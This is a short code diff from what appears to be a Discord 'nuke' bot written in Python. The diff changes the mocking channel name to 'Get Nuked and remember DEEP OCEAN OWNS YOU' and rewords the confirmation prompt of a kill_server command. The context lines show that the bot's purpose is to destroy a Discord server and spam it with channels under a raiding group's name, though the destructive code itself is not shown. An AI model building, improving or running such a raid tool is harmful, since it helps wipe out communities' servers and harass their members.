@@ -24,7 +24,7 @@ def keep_alive():
 # Configuration Constants
 TOKEN = os.getenv("DISCORD_TOKEN")
 INVITE_LINK = "https://discord.gg/NumaQpccKq"
-CHANNEL_NAME = "Deep Ocean Owns YOU"
+CHANNEL_NAME = "Get Nuked and remember DEEP OCEAN OWNS YOU"
 TARGET_COUNT = 56
 
 # Setup Bot Intents
@@ -50,7 +50,7 @@ async def on_ready():
 async def kill_server(ctx, confirm: str = None):
     # Verification check for the CONFIRM argument
     if confirm != "CONFIRM":
-        await ctx.send("⚠️ Tp really nuke type `.k!ll CONFIRM`")
+        await ctx.send("⚠️ Bro to confirm type`.k!ll CONFIRM`")
         return
 
     guild = ctx.guild
